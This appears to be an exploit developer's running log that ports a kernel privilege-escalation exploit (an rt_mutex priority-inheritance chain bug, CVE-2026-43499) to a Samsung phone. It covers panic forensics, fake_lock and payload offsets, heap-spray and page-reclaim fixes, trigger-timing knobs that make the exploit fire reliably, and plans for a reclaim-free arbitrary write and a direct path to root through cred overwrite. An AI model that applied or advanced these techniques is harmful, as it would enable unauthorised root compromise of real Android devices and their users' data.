- +0x478 `ldr x8, [x24, #0x18]`: x8 = rt_mutex **owner** (rt_mutex_base
  owner at lock+0x18 on this kernel). +0x484 `cmp x8, #1` + `b.ls
  +0x820`: owner <= 1 exits toward the loop-tail path.
- Owner > 1 falls through: +0x490 `and x19, x8, ~1` (next walked task =
  owner & ~RT_MUTEX_HAS_WAITERS), +0x498 `add x0, x19, #0x40`, +0x4a4
  `ldadd w8, w8, [x0]` = task->usage++ (get_task_struct). Then +0x4b4
  `add x26, x19, #0x924` -> `_raw_spin_lock(task->pi_lock)`, +0x4c0
  `ldr x22, [x24, #0x10]` (rb leftmost waiter) ...
- KP #55 took the owner>1 branch because the thief page's [base+0x998]
  read 0x0001000000000001. With OUR compact image [lock+0x18] =
  SLIDE_LOCK_OWNER_VALUE = 1, the walk takes b.ls -> +0x820 instead —
  the designed path. So the compact image geometry is still consistent
  end-to-end; only the reclaim race stands between us and the erase
  write primitive.

### Run 8 — fix #28 verdict + first successful fire/write (2026-08-01)

Run 8 (`SLABINFO_DIAG=1`, 20 attempts, NO device panic — all 20 attempts
completed, attempts 2-20 died early on F_SETPIPE_SZ EPERM resource
exhaustion from attempt 1's leaked state):

- Attempt 1 slabinfo: `leak` mm=1760/1760 slabs=132 (cache full),
  `post-free` slabs=118 (**14 emptied slabs reached the buddy allocator
  synchronously** — fix #21 discard works), `post-spray` mm unchanged
  (**mm cache is NOT the spray-window thief**), k8k slabs 626 -> 14278
  (our dgram spray allocated ~13k order-3 blocks from the buddy pool).
- Attempt 1 FIRED: pselect ret=2 with copyback values, and
  **`p0 physical write status=0 ok=1` — first ever successful physical
  write.** The walk/erase/write chain works end to end.
- But the gate read pipe 194 (redirected to the target page) as
  **all zeros** (q0-q7 = 0, `hits=0 changed=1`): the target page was
  FREE/zeroed at walk time. Despite 13k order-3 spray allocations right
  after the free, the block was NOT ours — it must reach the buddy pool
  LATE (deferred discard / partial-list churn from the ~1000 prepare_ctx
  child kills that run AFTER the spray), missing the one-shot spray.
- Attempt slot 2 then ran with parent=0/target=0 (degenerate after
  gate hits=0) and failed.

### Fix #29 — RECLAIM_WAVES: spray waves across the whole window (2026-08-01)

- `src/util.c`, env `RECLAIM_WAVES=N` (1-64, default 20),
  `RECLAIM_WAVE_GAP_MS` (default 8): after the one-shot spray, a
  detached pthread fires N waves of small reclaim bursts (fresh
  socketpairs: 512 dgrams + 64 stream frags per wave) every 8 ms —
  covering ~160 ms, the full arming window up to and past the consumer
  walk (~110-170 ms). Whenever the block lands in the buddy pool, a
  wave claims it with our image before the walk.
- Wave thread pinned to exploit_core+2 to avoid disturbing the arming
  timeline; wave sockets are thread-local and closed at thread exit.
- Run 9 = run 8 knobs + `RECLAIM_WAVES=20`. Success = gate
  `hits=1 changed=0` -> then drop DIAG for the full root chain.

### Run 9 verdict + kernel-config findings (2026-08-01)

- Run 9 attempt 1 fired + physical write ok=1 again, but the gate still
  read the target page as all zeros (`hits=0 changed=1`), even with 20
  spray waves covering ~160 ms. (Wave dgram sockets capped at ~28 sends
  — default SO_SNDBUF — so waves were weaker than designed.)
- Device config (re-pulled /proc/config.gz via exec-out — `adb shell
  cat` CRLF-mangles binaries):
  - `CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y` — pages zeroed ON ALLOC, so a
    zeroed gate page = freshly allocated/unwritten, NOT proof of
    "free page" (INIT_ON_FREE is OFF).
  - `CONFIG_SHUFFLE_PAGE_ALLOCATOR=y` — freed blocks land at RANDOM
    free-list positions: the LIFO "our next alloc gets our block"
    assumption is dead on this kernel.
  - `CONFIG_SLAB_FREELIST_HARDENED=y` — a fully-freed slab page would
    show obfuscated freepointers (non-zero), so the all-zero page is
    not a retired slab either.
- Remaining model: the block sits in a free-list our UNMOVABLE socket
  sprays never draw from (pageblock migratetype MOVABLE/RECLAIMABLE,
  and/or shuffle-buried), until the kernel splits it into order-0
  MOVABLE pages that random system allocations consume.

### Fix #30 — RECLAIM_WAVE_ANON: MOVABLE order-0 image waves (2026-08-01)

- `src/util.c`, env `RECLAIM_WAVE_ANON=1`: each reclaim wave also mmaps
  2 MB of anonymous pages and memcpys the compact 4 KB image into every
  page (512 image pages/wave).  Anon faults are the highest-rate
  controlled MOVABLE order-0 allocations available; once the block
  splits, its pages enter the MOVABLE order-0 pool and our sustained
  image-filled faults are the likeliest receivers.
- Wave dgram sockets now get SO_SNDBUF=4 MB (run 9 capped at ~28
  sends/wave).
- Run 10 = run 9 knobs + `RECLAIM_WAVES=24 RECLAIM_WAVE_ANON=1`.
  Success = gate `hits=1` (marker found anywhere in the page — the
  marker scan is the definitive reclaim test; head-of-page zeros are
  expected even on a hit because the image head is zero padding).

### Run 10 verdict + KP #56: corruption lands in a vmemmap LRU (2026-08-01)

- Run 10 attempt 1 was the earliest failure ever: the userspace log
  stops right after the p0 profile line — before even
  "pipe oracle prepared". No gate output at all.
- KP #56 (`lastkmsg_56.txt`) shows the boot stayed up ~27 min; the only
  fatal event is at uptime 1649 s (the earlier "Call trace" lines at
  1555 s are benign `rtnl_lock` contention warnings from
  binder/wpa_supplicant, unrelated):

  ```
  list_del corruption. prev->next should be fffffffe25014d88,
      but was fffffffe22d92948. (prev=fffffffe2723fa08)
  kernel BUG at lib/list_debug.c:61!
  pc : __list_del_entry_valid+0xbc/0xd4
  Call trace: __list_del_entry_valid <- evict_folios+0x107c
      <- try_to_shrink_lruvec <- shrink_one <- shrink_node
      <- balance_pgdat <- kswapd
  ```

- Address forensics (all `fffffffe...` = vmemmap / `struct page` land):
  - Victim: `prev` = `ffffffe2723fa08` = `struct page` at
    `ffffffe2723fa00`, field `lru.next` (+0x8). With
    `VMEMMAP_START=0xfffffffe00000000` that is pfn `0x9c8fe8` → direct
    map VA **`ffffff89c8fe8000` — exactly run 8's target page base**.
  - Corrupting value `ffffffe22d92948` is *also* a vmemmap pointer:
    `struct page` at `ffffffe22d92940`, its `lru` (+0x8) — i.e. a
    folio-list link value (VA `ffffff88b64a5000`).
- Conclusions:
  1. The page at VA `ffffff89c8fe8000` is **real RAM**: in run 10's
     boot it was a live folio sitting on an LRU that kswapd tried to
     evict. The high VA/PA region (pfn `0x9c8fe8`, PA ≥ 0x9c8fe8000) is
     genuine DDR — the device has high/sparse banks, and the
     VMEMMAP/direct-map formulas are confirmed by in-kernel evidence
     (not just by the walk not faulting). `/proc/device-tree/memory/reg`
     is root-only (320 B ≈ 20 bank entries) so the bank map cannot be
     dumped as shell; this LRU evidence substitutes for it.
  2. Run 10's corruption wrote a *folio-list pointer* into a *struct
     page's lru field* — a vmemmap→vmemmap scribble. Two candidate
     sources, both from our machinery after a missed reclaim: the erase
     physical write with a wrong `target` (gate pipe pipebuf address
     wrong/stale), or the off-rails rt_mutex walk performing
     plist/rb-tree link writes with values read from garbage pages.
     Either way it is the same delayed-blast pattern as KP #51: silent
     scratch at fire time, fatal only when an unsuspecting kernel
     thread (here kswapd) later walks the damaged list.
- Practical impact: after a missed reclaim the exploit must expect the
  walk/erase to scribble; runs are one-shot and every fire that misses
  risks a dirty kernel. This makes the gate *tenant identification*
  (what actually landed in the target page) the critical datapoint.

### Fix #31 — gate tenant identification dump (2026-08-01)

- `src/pipe.c`, `verify_p0_pipe_oracle_gate()`: when the gate reads the
  target page back and the marker scan misses (`changed` branch),
  additionally dump the non-zero byte count of the whole 4 KB page plus
  the qwords at +0x40 / +0x980 / +0x9C0 / +0xA20 (image head, waiter
  slot, marker lead-in). Verdict key for run 11:
  - non-zero count == 0 → page never written: block sat idle in
    buddy/PCP or was allocated but never filled → reclaim channel still
    too narrow/slow.
  - +0x980/+0xA20 hold image values (waiter address / "RMG-P0-O…") →
    reclaim **hit** and only the marker placement is wrong → fix marker
    offset or drop DIAG and go for the full chain.
  - non-zero but foreign values → identify the thief from the content.

### Run 11 — fix #31 verdict: full prep chain, panic at the trigger instant (2026-08-01)

- First run with the whole stack (fix #21 + #26 + #28 + #29 + #30 + #31)
  on a fresh boot. Every preparation stage passed cleanly:
  - Leak stable: mm base `ffffff88f45e8000` (same region as run 8).
  - Slab discard effective: post-free mm objects 1856→1834 (target
    slab emptied, `LATE_NEIGHBOUR_FREE` working).
  - Spray volume strong: 13902 dgram sends + 14153 sk_buff sends;
    k8k slabs 546 → 7443 (ample buddy uptake).
  - Physical write channel computed: `pipebuf=ffffff89da8d0000`,
    `target=...0800`, `parent=fffffffe23d17a00`.
- The log (unbuffered) ends at `slide consumer sched idx=0
  t=111437` — 60 ms after pselect arming (t=50893), i.e. exactly at the
  trigger instant. adb exited 255: the device panicked right there and
  the fix #31 gate tenant dump was never emitted. Trigger-side crash,
  not a preparation failure.
- KP #57 (`prev_dump_rwc57.log`, RWC:57): `rt_mutex_adjust_prio_chain+0x4a4`,
  fault addr `0001000000000040`, in our `id` child at the trigger instant.
  x24=x3=ffffff88f45e8980 = attempt-1 fake_lock (compact layout base+0x980),
  x19=0001000000000000, x9=0000000100000002. Same thief content as KP #55.
  The fix #31 tenant dump was never reached (panic at the walk).

### Run 12 — KP #58, identical (2026-08-01)

`LATE_NEIGHBOUR_FREE=1 DGRAM_RECLAIM=1 SKB_RECLAIM_SOCKS=8 RECLAIM_WAVES=24
RECLAIM_WAVE_ANON=1 MM_DRAIN_TRIGGERS=16 ... PARENT_PIPEBUF=1 DIAG=1`,
20 attempts. Attempt 1: 1568 dgram sends (~224/socket, the device's
qlen cap despite SNDBUF=8 MB), 1596 stream frags, then fired and
panicked at the trigger. KP #58 (`prev_dump_rwc58.log`, RWC:58) is
byte-identical to #57: `+0x4a4`, fault `0001000000000040`, x19/x9 =
`0001...` thief content. The deep spray still loses the block.

### Fix #32 — DGRAM_QLEN (2026-08-01)

`src/util.c`: per-socket dgram count was hard-capped at
`reclaim_sends*8` (~224 observed) although `max_dgram_qlen=2400`.
New env `DGRAM_QLEN` raises the per-socket target; the loop still stops
at ENOBUFS/EAGAIN. With `DGRAM_QLEN=2000` the spray reaches ~249/socket
(1743 total across 7 socks) — modest, confirms the device binds below
2400 but above 224.

### Fix #33 — compact-mode slot parents/targets (2026-08-01)

`src/util.c` `prepare_skb_payload()`: under the compact image only slot
0 was given parent/target; slots 1-3 (probe/restore) stayed 0.  After a
diagnostic gate miss the flow re-armed slot 2 with parent=target=0 and
the walk hit the sanity BUG.  Now all four slots get the same parents/
targets as the legacy path (gate/probe/restore), so a slot-2+ trigger
no longer runs degenerate.

### Run 13 — KP #59, the sanity-BUG fire (2026-08-01)

fix #32+#33, 20 attempts. Attempt 1 fired cleanly: `pselect ret=2`,
copyback `in word=3`/`ex word=1`, `p0 physical write status=0 ok=1`,
gate `hits=0 changed=1` (pipe 225, q0=fffffffe230c3ac0 — same shape as
the PARENT_PIPEBUF diagnostic).  Reclaim still missed (u980/u9c0/ua20
all zero).  Attempt 2 then re-armed slot 2 (fix #33 not yet effective
on that build) and panicked. KP #59 (`prev_dump_rwc59.log`, RWC:59):
`kernel BUG at kernel/locking/rtmutex_common.h:118`,
pc `rt_mutex_adjust_prio_chain+0x858`, lr `+0x130`, x24=x3 =
attempt-2 fake_lock, x19=x9=x5 = a real task pointer — the walk reached
the top-waiter sanity check and BUGged because the chain was off-rails.
This is the "erase completed but chain inconsistent" signature.

### Run 14 — KP #60, identical thief (2026-08-01)

fix #32+#33 active, 20 attempts. Attempt 1 fired and panicked at the
trigger. KP #60 (`prev_dump_rwc60.log`, RWC:60): `+0x4a4`, fault
`0001000000000040`, x19/x9 = `0001...` — same thief content as
#55/#57/#58.  Four fires under fix #21, four identical `+0x4a4`
thief-content crashes: the thief is deterministic, not a race.

### The decisive model: dgram slab growth is the thief (2026-08-01)

Cross-referencing the six `+0x4a4`/`+0x858` fires:

- Every fire's fake_lock page contains `task+0x348 =
  0x0001000000000000` and a second small-int qword (`0x0000000100000002`).
  These are **packed-small-int kernel-object bytes**, NOT our compact
  image (whose task+0x348 = 0) and NOT a stream frag (would be
  payload/zeros).  The values are consistent with a freshly allocated
  **kmalloc-8k slab page**: hardened-freelist pointers in object 0 and
  one just-allocated object holding packed ints.
- The ONLY controlled order-3 slab-growth source in the critical window
  is our own dgram spray (its ~4 KB data buffers are kmalloc-8k,
  order-3).  Under `CONFIG_SHUFFLE_PAGE_ALLOCATOR` the buddy hands a
  freshly freed block to the NEXT slab growth — so the target block
  becomes a kmalloc-8k slab-metadata page before any dgram data lands
  in it, and the walk reads the slab's packed-int header.
- The stream-frag channel never wins either: with dgram disabled
  (run 17, stream-only, legacy layout `lock=base+0x4200`), the fire's
  gate tenant dump showed `u980/u9c0/ua20 = 0` and NO `+0x130 trylock(0)`
  panic — i.e. the legacy fake_lock at base+0x4200 was non-zero (real
  content), so the walk got past the trylock and later BUGged at
  `+0x858`.  So the stream page also is not ours, but it carries
  kernel content, not zeros.

**Conclusion:** the freed mm_struct order-3 block is reliably
buddy-released (fix #21 works: `slabinfo[post-free]` shows the slab
count drop), but on this kernel the next slab-growth allocation
(dgram data, kmalloc-8k) claims it as slab metadata — never as our
payload.  The reclaim is therefore not a "race we can win with more
volume"; the channel itself is wrong.  The remaining lever is to make
the FIRST post-free allocation a channel whose slab pages carry our
payload as DATA, not metadata — i.e. reclaim at the object level in a
cache we control, or stop relying on page-level cross-cache entirely.

### Fix #34 — ZERO_DRAIN_FREE (2026-08-01)

`src/util.c`, env `ZERO_DRAIN_FREE=1`: sets `late_neighbour_free=0` and
`drain_triggers=0`, so no prepare_ctx drain kills run before the
neighbour frees.  Motivation: the 16 drain kills each exit a child,
freeing ~2 order-3 pages (kernel stack + mm slab page) that replenish
kmalloc-8k partials before the target slab is freed — another
self-inflicted theft.  Run 15 (zero-drain) still fired and missed
(KP #61, `prev_dump_rwc61.log`, `+0x130 trylock` with fake_lock=0 —
zeroed page).  Removing the pre-free drains did not change the outcome;
the theft is downstream of the frees, not caused by them.

### Fix #35 — HOLD_PREPARE_CTX (2026-08-01)

`src/util.c`, env `HOLD_PREPARE_CTX=1`: defers the ~1000 prepare_ctx
child kills (and their memfd closes) until after the walk.  Each of
those exits frees an order-3 kernel-stack page on the exploit core,
which the queued dgram/stream frags consume as slab growth — the
largest self-inflicted order-3 free source in the window.  Run 16
(zero-drain + hold + dgram) still fired and missed (KP #62,
`prev_dump_rwc62.log`, `+0x4a4`, `0001...` thief content).  So even
with both self-interference sources removed the dgram slab growth
still claims the block — confirming the channel is the problem, not
the timing.

### Run 18 — KP #63, dgram fire after 12 no-fire attempts (2026-08-01)

Same knobs as run 16.  Attempts 1-13 all `pselect ret=0`, `write
status=256 ok=0`, `gate 0/0` (residue absent — the ~1/10 fire rate
whiffed 13 times).  Attempt 14 fired and panicked. KP #63
(`prev_dump_rwc63.log`, RWC:63): `+0x130 trylock`, fake_lock
(base+0x980) = 0 — a ZEROED page.  This is the first dgram run that
shows a zeroed page (vs the `0001...` packed-int content of #57-#62),
i.e. on attempt 14 the target block was freshly buddy-released and
zeroed by `INIT_ON_ALLOC` but not yet claimed by slab growth.  The
variance (packed-int vs zeroed) is just how far the dgram slab growth
had progressed when the walk fired; both are reclaim misses.

### Consolidated blocker (2026-08-01, end of session)

- Trigger / arming / walk / erase / physical write: **all work** (fires
  on ~1/10 windows, `p0 physical write ok=1`, erase completes).
- Leak (mm + pipe page): **~100%** (fix #9, #27).
- Target-slab buddy release: **works** (fix #21, slabinfo drop at
  post-free).
- Reclaim channel: **broken** — the freed order-3 block is claimed by
  the next slab-growth allocation (kmalloc-8k / dgram data) as slab
  metadata, never as our payload.  Six fires (#55,#57,#58,#60,#62,#63)
  all walked third-party content; volume, waves, anon faults,
  zero-drain, and hold-prepare all fail to change the walked content.

**Next direction** (not yet implemented): abandon page-level
cross-cache via skb/dgram.  Options, in order of promise:
1. Object-level reclaim in a controllable cache that allocates from the
   same order-3 pool the mm_struct slab releases to — e.g. spray a
   controlled-content object whose allocation path grows a slab on the
   freed block, with the payload living in the object DATA (which a
   fresh slab page does NOT overwrite).  Requires identifying such a
   cache (msg_msg is unavailable: `CONFIG_SYSVIPC` off; skbuff data is
   the wrong class; pipe_buffer array is the wrong class).
2. Reclaim the freed block with a HUGE number of tiny controlled
   allocations that out-compete slab growth for the block's first
   split (anon faults already tried — fix #22/#30, loses).
3. Re-derive the walk so it does not need a payload page at all
   (point the erase's parent/target at real kernel objects leaked via
   the pipe oracle), turning the primitive into a pure write-what-where
   without reclaim.  This is the most promising: the erase already
   lands two pointers at attacker-controlled addresses; if both are
   real, leaked kernel objects (e.g. the oracle pipe's own pipe_buffer
   array), the reclaim of the mm_struct page becomes unnecessary.

### Runs 19-22 — fire rate solved; reclaim tenant confirmed foreign (2026-08-01)

Fire-rate measurement (the second blocker):

- **Stream-only reclaim gives a near-zero fire rate.** Run 19
  (stream-only, 100 ms window, burst=1): 25 armed windows, 0 fires.
  Run 20 (stream-only, 150 ms window, burst=1): 5 windows, 0 fires,
  then KP #65 (`+0x130 trylock`, fake_lock=0 — a dead-frame shot past
  the 100 ms residue lifetime; the 150 ms window only extends the
  dead-frame zone, it does NOT recover fires).  The residue dies ~100
  ms after the waiter's 50 ms timeout; widening the pselect window past
  that only lets the consumer fire at a cleaned-up stack frame.
- **Dgram reclaim fires ~1/12** (runs 18/21: attempt 14 and attempt 3
  respectively).  The dgram channel both reclaims AND preserves the
  residue better than stream-only.
- **Burst mode fires attempt ~1 reliably.** Run 22 (dgram +
  `SLIDE_CONSUMER_BURST=3 SLIDE_CONSUMER_SPACING_USEC=15000
  SLIDE_PSELECT_TIMEOUT_MS=120`): attempt 1 fired
  (`pselect ret=1`, 3 sched_setattr shots at t=111/127/143 ms, all
  `sched_ok=1`, `p0 physical write status=0 ok=1`).  Each burst shot
  re-tests the dangling `pi_blocked_on` independently, so the ~1/10
  residue race becomes ~1-(0.9)^3 ≈ 1/3 per window, and the first shot
  usually lands in-window.  **Use burst=3 for all future runs.**

Reclaim tenant identification (fix #31 dump) on a clean dgram fire:

- Run 21 attempt 3 (dgram, PARENT_PIPEBUF): `write ok=1`, gate
  `changed=1` (pipe 117), tenant dump
  `q0=fffffffe252382c0 q1=0x1000 q2=0 q3=0x10 q4=0 q5-q7=0`,
  `u40/u980/u9c0/ua20 = 0`.  **q4 (= page offset +0x20, and +0x4200 in
  the legacy layout) reads ZERO.**  A kmalloc-8k slab page would have
  non-zero freelist/object content at those offsets; the page instead
  reads as **free/zeroed** (INIT_ON_ALLOC zeroed it, nothing wrote it).
  Run 21 attempt 4 (KP #66, `+0x858` BUG): x19=x9=x5 = a real task
  pointer — the SAME block was a LIVE task on that attempt.
- **Conclusion: the freed mm_struct order-3 block is genuinely returned
  to the buddy allocator (fix #21 slabinfo drop confirms), but our
  dgram/stream spray NEVER claims it.**  Its tenant at walk time varies
  per attempt — free/zeroed (attempt 3) or reclaimed by an unrelated
  system allocation (attempt 4) — but is NEVER our payload.  This kills
  the earlier "dgram slab growth steals it as metadata" theory: the
  block is not even being consumed by slab growth; it sits free (or is
  taken by a third party) while our ~1700-4000 queued dgram/stream frags
  draw from OTHER buddy blocks.  The reclaim channel is broken at the
  "which buddy block does my allocation get" level, not the "who wins
  the race" level.

**Confirmed working stack (2026-08-01):** leak (~100%), buddy release
(fix #21), fire (burst=3, ~attempt 1), walk, erase, physical write
(`ok=1`).  **Confirmed broken:** payload reclaim — the freed block never
receives our content, so the erase always walks foreign/zero memory and
the write lands on the wrong page (or BUGs).  The reclaim-free
redirection (option 3 above) is now the primary path.

### Reclaim-free feasibility analysis (2026-08-01)

The reclaim dependency is structural, not incidental:

- The pselect fd_sets arm a fake `rt_mutex_waiter` on the kernel stack.
  Its rb-tree parent/target ARE leaked addresses (pipebuf / kernel text)
  and need no reclaim.  But the walk also consumes `waiter->task` and
  `waiter->lock`, which MUST point at attacker-controlled memory whose
  `task->pi_waiters`/`pi_lock`/`task_group` and `lock->waiters`/`owner`
  fields are arranged so the chain-walk reaches `rb_erase` with our
  parent/target.  That memory is the reclaimed payload page.
- With a REAL kernel task as `waiter->task` (leakable via the pipe
  oracle / KernelSnitch), the walk reads the task's genuine
  `pi_waiters.rb_leftmost` and `pi_lock`.  It only proceeds to the
  erase if the task is genuinely PI-blocked on a lock whose top waiter
  is our stale stack waiter — i.e. the real task must itself be in the
  EDEADLK stale-waiter state.  That is exactly the waiter thread we
  already control, but its REAL task_struct address is not currently
  leaked (KernelSnitch leaks the mm/page, not the task).

**Two concrete reclaim-free designs, in order of implementation cost:**

1. **Waiter-task self-link.** Leak the waiter thread's own
   `task_struct` (e.g. via a KernelSnitch variant targeting
   `task_struct`, or a pipe-oracle read of a task list).  Set
   `waiter->task = <real waiter task>` and `waiter->lock = <real
   f_pi_target rt_mutex>` (also leaked).  The walk then operates
   entirely on real objects; the stale waiter's dangling `pi_blocked_on`
   makes the real task look PI-blocked on f_pi_target, and
   `rt_mutex_adjust_prio_chain` erases/reinserts the ARMED stack
   `tree_entry`/`pi_tree_entry` nodes (it does NOT require tree
   membership — see the fix #16 conclusion).  The erase's
   `rb_set_parent_color` write then lands `parent` into `target` with
   both being leaked oracle addresses — no payload page, no reclaim.
   Requires: a task_struct leak + an f_pi_target rt_mutex leak.
2. **First-principles walk redirect.** Re-derive the chain-walk input so
   the erase's parent/target are the ONLY controlled values and the
   task/lock chain is satisfied by real objects.  This is a larger
   re-derivation of the rt_mutex state machine and is the fallback if
   (1) cannot produce the two leaks.

Both need new leak primitives (task_struct and/or rt_mutex).
**Assessment (2026-08-01):** the KernelSnitch framework leaks via
`futex_hash(futex_addr, mm_struct)` — it is mm_struct-specific and
cannot be retargeted to task_struct (no equivalent
`futex_hash(..., task_struct)` oracle).  A task_struct leak requires a
different primitive (task-list walk from `init_task`, which itself
needs an arbitrary read first — circular — or a new side channel).
The virtual KASLR base IS available pre-trigger
(`slide_read_stext()` via boot_id), so all kernel TEXT/data VAs are
computable; only the physical pipebuf and any task/lock addresses need
leaks.  This is a substantial redesign requiring new leak research and
many device-validation cycles; it is the planned next phase, not yet
implemented.

### Session summary (2026-08-01, end)

- Runs 11-22, KP #57-#66 analyzed.  Fixes #27-#35 implemented and
  tested (KSNITCH_COLLISIONS=6, DGRAM_QLEN, compact slot parents,
  ZERO_DRAIN_FREE, HOLD_PREPARE_CTX).
- **Fire-rate bottleneck SOLVED**: `SLIDE_CONSUMER_BURST=3
  SLIDE_CONSUMER_SPACING_USEC=15000` fires attempt ~1 reliably (run 22).
  Stream-only reclaim must be avoided (near-zero fire rate); use dgram.
- **Reclaim CONFIRMED broken at the allocator level**: the freed
  mm_struct order-3 block is genuinely buddy-released (fix #21) but our
  ~1700-4000 dgram/stream frags never claim it — its tenant at walk
  time is free/zeroed (run 21 attempt 3, q2=q4=0) or a third-party live
  task (run 21 attempt 4 / KP #66), never our payload.  Not fixable by
  volume/timing/self-interference removal (all tried).
- Walk + erase + physical write all work (`p0 physical write ok=1`) but
  always consume foreign/zero memory because of the reclaim miss.
- Root is NOT yet achieved.  Next phase: reclaim-free write via a new
  task_struct/rt_mutex leak (above), or a fundamentally different
  primitive.

### Upstream survey (2026-08-01)

Two upstreams were checked for reclaim/walk improvements relevant to the
S9280 reclaim block:

**1. `BuSung-dev/Root-My-Galaxy-Payloads` (origin).** Local `main` is 11
commits behind / 4 ahead.  The 11 upstream commits are mostly new-device
profiles (Galaxy A56 all-models, SM-A566E CCZG6) plus a v3 manifest schema
(`targets-v3.json`, kernel-version matching, shared S25 payload).  Only ONE
commit touches the exploit sources: `44ee079` ("Add SM-A566E CCZG6 payload
profile"), and its `src/slide_app.c`/`src/preload.c` changes are orthogonal
to S9280:
- `SLIDE_PHYSICAL_SLOT_DELAYS_USEC`: per-slot retry loop in
  `slide_trigger_physical_slot` (replaces the single-attempt design).
- `APP_PAYLOAD_ATTEMPT_DELAYS_USEC` / `APP_FOPS_ROUTE_USE_PSELECT_DELAY` +
  `PSELECT_DELAY_USEC`: configurable attempt/route delays.
These are additive `#if defined(...)` blocks, off by default, and do NOT
conflict with the S9280 reclaim fixes (#21-#35).  Safe to merge.

**2. `NebuSec/CyberMeowfia` (original exploit source).** Recent commits
(2026-07-13) only add Pixel 6/9a/10 targets (all GKI, sharing ONE generic
`slide.c`/`util.c`).  The reclaim implementation is byte-for-byte the same
design as the S9280 one (KernelSnitch mm leak -> `skb_buf` payload -> single
SOCK_STREAM `sendmsg` spray).  **No reclaim-free technique exists upstream.**

**Key design difference worth porting:** upstream `slide.c` arms the stale
waiter with `task = SLIDE_INIT_TASK` (the REAL `init_task`, whose VA is
computable from the KASLR slide) and reclaims ONLY `fake_lock`.  The walk
then follows init_task's genuine `pi_waiters`/`pi_lock`, and the erase's
parent/target are KASLR-computable kernel-data VAs (`SLIDE_LOGGERS_0_1`,
`SLIDE_RANDOM_BOOT_ID_DATA`) that need NO reclaim.  This reduces the reclaim
surface from 2 objects (S9280's `SLIDE_USE_FAKE_TASK`: fake_task+fake_lock)
to 1 (fake_lock only) and makes the erase target reclaim-free.  Whether this
single-fake_lock design reaches `rb_erase` on the Samsung 6.1 kernel
(vs upstream's Pixel GKI targets) is untested on S9280; it is the most
promising concrete lead the upstream survey produced.

### Upstream merge + run 27 erase proof (2026-08-01, cont)

**Merge:** `origin/main` merged (`f5a520b`).  Conflicts were `slide_app.c`
(whole-file CRLF; resolved to ours, which carries all fixes #14-#35) and
`support/targets-v2.json` (competing 4th profile; merged to 5 targets =
3 shared + S9280 + A566E).  The orthogonal upstream slot-delay knobs from
`44ee079` (`SLIDE_PHYSICAL_SLOT_DELAYS_USEC` etc.) were NOT ported — they
duplicate the S9280 `SLIDE_ENTER_DELAY_USEC` mechanism.  Build verified
(`make TARGET=e3q-S9280ZCS6DZF2`, 1 pre-existing warning only).

**Run 27 — erase EXECUTES, reclaim is the sole wrong-landing cause.**
Config: `ZERO_DRAIN_FREE=1 HOLD_PREPARE_CTX=1 DGRAM_RECLAIM=1 DGRAM_QLEN=2000
SKB_RECLAIM_SOCKS=8 SLIDE_CONSUMER_BURST=3 SLIDE_CONSUMER_SPACING_USEC=15000
P0_ORACLE_PARENT_PIPEBUF=1` (fixed `SLIDE_ENTER_DELAY_USEC` REMOVED — the
fixed 60000 delay collapsed the fire rate in runs 24-25; the varied-delay
default restored it).
- attempt 1 (delay=25000): 3-shot burst, `pselect ret=1`, `physical write
  ok=1`, but `pipe gate hits=0 changed=0` -> reclaim miss (chain page
  foreign), erase consumed garbage.
- attempt 2 (delay=20000): 3-shot burst, `pselect ret=1`, `physical write
  ok=1`, `p0 gate changed pipe=215 nonzero=35` (q0=fffffffe249d4c80
  q2=ffffffc009259d90 q3=0x10) -> **the PI-walk rb_erase WRITE ACTUALLY
  EXECUTED into a live pipe_buffer page**.  But `hits=0 changed=1` = it
  landed on an UNEXPECTED page, not `target=pipebuf+0x800`.

This is the cleanest causal chain yet: fire (burst=3, varied delay) is
reliable, and the walk reaches and performs the rb_erase write.  The write
lands on the wrong page ONLY because `waiter->task`/`waiter->lock` resolve
to foreign memory (reclaim miss), so the erase's parent/target come from a
wrong task/lock chain instead of our payload.

**Consequence for the reclaim-free path:** the upstream INIT_TASK design
(survey above) reclaims only `fake_lock` (vs S9280's 2 objects) but does NOT
eliminate reclaim — `fake_lock` still needs the spray to land.  On S9280
where reclaim is fully broken, reducing 2->1 object is unlikely to suffice.
The genuine fix remains making the ENTIRE task+lock chain resolvable without
reclaim (all pointers KASLR-computable or oracle-leaked).

**Run 28 — INIT_TASK experiment was a no-op (correctly reverted).**
Setting `SLIDE_USE_FAKE_TASK=0` did NOT change the physical-slot path:
run 28 attempt 2 still logged `task=ffffff88e9738000` (= `page_base`, the
reclaimed fake_task), because `select_slide_payload_index()` sets
`fake_task`/`fake_lock` unconditionally from `slide_bank_payload_base`
regardless of `SLIDE_USE_FAKE_TASK`.  That macro only selects the
`task`/`lock` WORD in the pselect fd_sets (slide_app.c:181/218), not the
chain VA used by the physical slot.  Outcome was identical to run 27
(`changed=1`, wrong page).  Reverted to `SLIDE_USE_FAKE_TASK=1` and rebuilt.
**Lesson:** a real INIT_TASK port requires rewiring
`select_slide_payload_index()` + the physical-slot chain to point at
KASLR-computable addresses, not flipping the macro — a deeper change that
still leaves `fake_lock` reclaim-dependent.

### Cross-device port survey (2026-08-01)

Five CVE-2026-43499 ports were studied to find a better reclaim/write
primitive than the S9280 one:

| Port | Kernel | Reclaim | Root path | Status |
|------|--------|---------|-----------|--------|
| NebuSec (original) | Pixel GKI 6.x | mm leak + stream spray | fops->configfs->pipe phys->UMH | works |
| JoinChang/ghostlock-oneplus | 6.12 GKI | mm leak + stream spray (identical) | Path A UMH / **Path B direct PI write (SELinux + cred)** | verified (Ace 6T, 15, Xiaomi 17) |
| x-spy/popsicle | 6.12 GKI | mm leak + stream spray (identical) | **direct-root: percpu current_task -> cred=init_cred** | verified (Xiaomi 17 Pro Max) |
| pubglite55/oppo-ghostlock | 5.10 | same | blocked (CFI/write) | stuck |
| Dere3046/ElevateMe | — | same | rb_erase cred overwrite | reference |

**Finding 1 — the reclaim design is IDENTICAL across every port.**  All use
KernelSnitch mm_struct leak -> `skb_buf` payload -> a single
`SOCK_STREAM sendmsg` spray, and all arm the stale waiter with
`task=SLIDE_INIT_TASK` + a single reclaimed `fake_lock`.  popsicle's spray
ordering (free neighbour slabs, `close(leak_memfd)` LAST, then spray) is
byte-equivalent to the S9280 fix #21 (`LATE_NEIGHBOUR_FREE`).  **The S9280
reclaim implementation is already as advanced as the working ports.**  The
only difference is the allocator: on 6.12 GKI the freed mm_struct order-3
block is reclaimed by the spray; on Samsung 6.1 it is not (runs 11-27).

**Finding 2 — a SHORTER root path exists (popsicle direct-root).**  S9280
currently does fops-overwrite -> configfs arb-write -> pipe-phys -> UMH.
popsicle instead uses the PI erase to redirect
